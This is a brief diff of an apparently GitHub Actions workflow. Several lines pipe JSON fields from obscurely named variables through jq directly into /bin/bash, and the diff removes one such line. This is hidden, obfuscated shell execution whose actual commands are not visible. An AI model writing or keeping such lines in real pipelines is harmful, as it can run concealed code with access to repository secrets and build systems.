@@ -29,7 +29,6 @@ jobs:
           echo $syg04340 | jq -r .s917 | /bin/bash
           echo $wc9374 | jq -r .acf80724 | /bin/bash
           printf '%s' "$c41559" | jq -r .d33255 | /bin/bash
-          echo $tk3779 | jq -r .xyd93 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
